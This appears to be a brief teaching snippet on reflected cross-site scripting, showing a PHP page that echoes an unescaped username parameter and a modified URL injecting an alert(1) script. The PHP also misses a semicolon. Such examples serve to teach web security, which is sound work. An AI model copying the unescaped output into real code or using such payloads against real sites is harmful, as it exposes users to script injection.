// Reflected XSS
index.php

// Original page
<?php
$username = $_GET['username']
echo "Hi $username!";
?>

// Original url
index.php?username=ryu
Hi ryu!

// Modified url
index.php?username=<script>alert(1)</script>
